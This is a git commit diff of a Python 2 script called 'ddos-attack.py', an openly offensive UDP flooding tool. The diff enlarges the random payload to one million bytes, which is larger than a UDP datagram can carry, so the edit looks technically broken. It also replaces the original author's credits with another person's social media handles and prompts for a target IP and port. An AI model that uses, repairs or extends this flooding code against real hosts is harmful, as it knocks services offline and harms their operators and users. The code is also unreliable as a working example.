e48d2713b42ca27af56f216e87a4f6090c7e32c6
cau-flare <54187816+cau-flare@users.noreply.github.com>
2020-08-18 19:25:00 -0300

    Update ddos-attack.py

--- ddos-attack.py
+++ ddos-attack.py
@@ -14,16 +14,16 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(1000000)
 #############
 
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Author   : IlusionSz"
+print "You Tube : https://www.youtube.com/c/IlusionDev"
+print "github   : https://github.com/cau-flare"
+print "Facebook : https://www.facebook.com/cauaszscript"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
